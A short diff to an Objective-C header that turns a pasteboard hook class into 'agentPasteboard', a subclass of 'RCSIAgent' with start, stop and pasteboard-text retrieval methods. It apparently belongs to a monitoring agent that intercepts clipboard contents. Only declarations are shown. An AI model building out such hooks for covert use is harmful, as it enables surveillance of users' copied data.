@@ -9,9 +9,15 @@
 
 #import <Foundation/Foundation.h>
 
+#import "RCSIAgent.h"
 
-@interface myUIPasteboard : NSObject
+NSData* getPastebordText(NSArray* items);
 
-- (void)addItemsHook: (NSArray *)items;
+@interface agentPasteboard : RCSIAgent
+
+- (void)addItemsHook:(NSArray *)items;
+
+- (BOOL)start;
+- (void)stop;
 
 @end
